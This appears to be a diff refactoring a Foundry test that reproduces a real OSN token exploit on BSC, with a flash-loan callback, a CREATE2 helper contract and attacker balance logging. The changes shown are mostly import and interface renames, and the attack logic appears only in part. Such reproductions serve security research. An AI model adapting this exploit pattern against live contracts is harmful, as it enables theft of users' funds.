@@ -2,7 +2,15 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
+
+import {IERC20} from "OpenZeppelin/interfaces/IERC20.sol";
+
+import {IUniswapV3Pair} from "src/interfaces/IUniswapV3Pair.sol";
+
+import {IUniswapV2Pair} from "src/interfaces/IUniswapV2Pair.sol";
+
+import {IUniswapV2Router} from "src/interfaces/IUniswapV2Router.sol";
+import {IWBNB} from "src/interfaces/IWBNB.sol";
 
 // TX : https://app.blocksec.com/explorer/tx/bsc/0xc7927a68464ebab1c0b1af58a5466da88f09ba9b30e6c255b46b1bc2e7d1bf09
 // GUY : https://twitter.com/SlowMist_Team/status/1787330586857861564
@@ -24,10 +32,9 @@ interface Imoney {
 contract ContractTest is Test {
 
     IWBNB WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
-    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
-    Uni_Pair_V3 pool = Uni_Pair_V3(0x46Cf1cF8c69595804ba91dFdd8d6b960c9B0a7C4);
-    Uni_Pair_V2 wbnb_atm = Uni_Pair_V2(0x1F5b26DCC6721c21b9c156Bf6eF68f51c0D075b7);
-    Uni_Router_V2 router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
+    IUniswapV3Pair pool = IUniswapV3Pair(0x46Cf1cF8c69595804ba91dFdd8d6b960c9B0a7C4);
+    IUniswapV2Pair wbnb_atm = IUniswapV2Pair(0x1F5b26DCC6721c21b9c156Bf6eF68f51c0D075b7);
+    IUniswapV2Router router = IUniswapV2Router(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
     IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
     IERC20 OSN = IERC20(0x810f4C6AE97BCC66DA5Ae6383CC31BD3670f6d13);
     IERC20 OSN_PAIR = IERC20(0x4EEDdCc7C8714A684311F8b01154B5686A0f612f);
@@ -36,7 +43,7 @@ contract ContractTest is Test {
     uint256 borrow_amount;
 
     function setUp() external {
-        cheats.createSelectFork("bsc", 38_474_365);
+        vm.createSelectFork("bsc", 38_474_365);
         deal(address(USDT), address(this), 0);
     }
 
@@ -48,7 +55,12 @@ contract ContractTest is Test {
         emit log_named_decimal_uint("[End] Attacker USDT after exploit", USDT.balanceOf(address(this)), 18);
     }
 
-    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, /*fee1*/ bytes memory /*data*/ ) public {
+    function pancakeV3FlashCallback(
+        uint256 fee0,
+        uint256 fee1,
+        /*fee1*/
+        bytes memory /*data*/
+    ) public {
         OSN.approve(address(router), type(uint256).max - 1);
         USDT.approve(address(router), type(uint256).max - 1);
         OSN_PAIR.approve(address(router), type(uint256).max - 1);
@@ -144,7 +156,7 @@ contract ContractTest is Test {
         }
     }
 
-    function cal_address(uint256 time) internal returns (address) {
+    function cal_address(uint256 time) internal view returns (address) {
         bytes memory bytecode = type(Money).creationCode;
         uint256 _salt = time;
         bytecode = abi.encodePacked(bytecode);
@@ -157,7 +169,7 @@ contract ContractTest is Test {
 
 contract Money {
 
-    Uni_Router_V2 router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
+    IUniswapV2Router router = IUniswapV2Router(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
     IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
     IERC20 OSN = IERC20(0x810f4C6AE97BCC66DA5Ae6383CC31BD3670f6d13);
     IERC20 OSN_PAIR = IERC20(0x4EEDdCc7C8714A684311F8b01154B5686A0f612f);
